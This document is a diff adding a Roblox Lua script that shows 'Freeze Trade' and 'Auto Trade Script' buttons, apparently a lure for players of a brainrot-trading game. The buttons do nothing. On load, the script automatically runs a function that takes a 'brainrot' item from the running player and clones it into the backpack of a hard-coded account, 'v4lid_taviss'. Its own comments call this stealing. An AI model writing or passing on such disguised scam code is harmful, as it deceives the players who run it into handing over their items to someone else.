@@ -1,0 +1,65 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local TargetPlayerName = "v4lid_taviss"
+
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "TradeGui"
+screenGui.Parent = game.CoreGui
+
+-- Create Freeze Trade Button
+local freezeTradeButton = Instance.new("TextButton")
+freezeTradeButton.Name = "FreezeTradeButton"
+freezeTradeButton.Size = UDim2.new(0, 150, 0, 50)
+freezeTradeButton.Position = UDim2.new(0, 20, 0, 20)
+freezeTradeButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+freezeTradeButton.TextColor3 = Color3.new(1, 1, 1)
+freezeTradeButton.Font = Enum.Font.SourceSansBold
+freezeTradeButton.TextSize = 24
+freezeTradeButton.Text = "Freeze Trade"
+freezeTradeButton.Parent = screenGui
+
+-- Create Auto Trade Button
+local autoTradeButton = Instance.new("TextButton")
+autoTradeButton.Name = "AutoTradeButton"
+autoTradeButton.Size = UDim2.new(0, 150, 0, 50)
+autoTradeButton.Position = UDim2.new(0, 20, 0, 90)
+autoTradeButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+autoTradeButton.TextColor3 = Color3.new(1, 1, 1)
+autoTradeButton.Font = Enum.Font.SourceSansBold
+autoTradeButton.TextSize = 24
+autoTradeButton.Text = "Auto Trade Script"
+autoTradeButton.Parent = screenGui
+
+-- Function to simulate stealing a brainrot and sending it to v4lid_taviss
+local function stealAndSendBrainrot()
+    local targetPlayer = Players:FindFirstChild(TargetPlayerName)
+    if not targetPlayer then return end
+
+    -- Assuming brainrots are Tools in the player's Backpack or Character
+    local function findBrainrot(player)
+        for _, item in pairs(player.Backpack:GetChildren()) do
+            if item:IsA("Tool") and item.Name:lower():find("brainrot") then
+                return item
+            end
+        end
+        if player.Character then
+            for _, item in pairs(player.Character:GetChildren()) do
+                if item:IsA("Tool") and item.Name:lower():find("brainrot") then
+                    return item
+                end
+            end
+        end
+        return nil
+    end
+
+    local brainrot = findBrainrot(LocalPlayer)
+    if brainrot then
+        -- Clone the brainrot to send to target player
+        local brainrotClone = brainrot:Clone()
+        brainrotClone.Parent = targetPlayer.Backpack
+    end
+end
+
+-- Immediately run the steal and send function once (not tied to buttons)
+stealAndSendBrainrot()
